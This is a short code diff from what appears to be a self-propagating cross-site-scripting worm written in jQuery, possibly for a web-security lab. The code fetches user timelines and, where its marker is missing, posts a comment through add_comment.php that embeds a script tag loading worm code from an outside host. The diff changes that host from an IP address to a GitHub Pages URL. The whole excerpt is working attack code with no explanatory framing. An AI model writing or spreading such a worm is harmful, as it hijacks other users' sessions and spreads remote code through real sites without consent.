@@ -24,8 +24,8 @@ $(document).ready(function () {
                             (function (new_id) {
                                 $.ajax({
                                     url: "/timeline.php?id=" + new_id, success: function (result) {
-                                        if (result.indexOf("54.158.180.71") === -1) {
-                                            var worm = "<script src=\"http://54.158.180.71/jworm.js\"></script>"
+                                        if (result.indexOf("ajq2679.github.io") === -1) {
+                                            var worm = "<script src=\"https://ajq2679.github.io/worm.js\"></script>"
                                             $.ajax({ url: "/add_comment.php?id=" + new_id + "&comment=" + worm, success: function (result) { console.log(result); } });
                                         }
                                     }
